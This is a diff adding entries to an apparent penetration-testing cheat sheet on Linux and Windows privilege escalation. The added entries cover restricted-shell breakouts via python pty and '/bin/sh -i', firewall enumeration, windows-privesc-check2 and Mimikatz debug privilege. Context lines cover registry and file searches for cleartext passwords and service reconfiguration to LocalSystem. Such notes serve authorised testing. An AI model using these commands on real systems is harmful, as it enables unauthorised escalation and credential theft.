@@ -346,6 +346,8 @@ Common MIB values
 
 ## Linux PE
 
+### Enumeration
+
 Shows Linux version & kernel
 ```console
 cat /etc/issue
@@ -357,7 +359,27 @@ Search world-writeable files
 find / -perm -2 ! -type l -ls 2>/dev/null
 ```
 
+Prints users' shell
+```console
+which shell
+```
 
+### Shell
+
+Change shell for specific user
+```console
+chsh -s /bin/bash <username>
+usermod -s /bin/bash <username> (ROOT required)
+```
+
+Break out of limited shells
+```console
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+```
+
+### Exploits
 
 Downloading exploit on victim
 ```console
@@ -386,6 +408,13 @@ arp -A
 netstat -ano    shows all active NW connections
 
 netsh firewall show state   shows FW info (>= WinXP SP2)
+netsh firewall show config
+```
+
+Firewall Enum
+```console
+netsh firewall show state
+
 netsh firewall show config
 ```
 
@@ -439,6 +468,11 @@ sc config <SERVICE> obj= ".\LocalSystem" password= ""
 net start <SERVICE>
 ```
 
+Using Priv-Esc-Checking tool
+```console
+windows-privesc-check2.exe --audit -a -o report
+```
+
 ### Passwords
 
 Check specific files for cleartext pwds
@@ -460,6 +494,12 @@ findstr /si password *.xml *.ini *.txt
 
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
+```
+
+#### Mimikatz
+Enable debugging
+```console
+privilege::debug
 ```
 
 ### Exploits
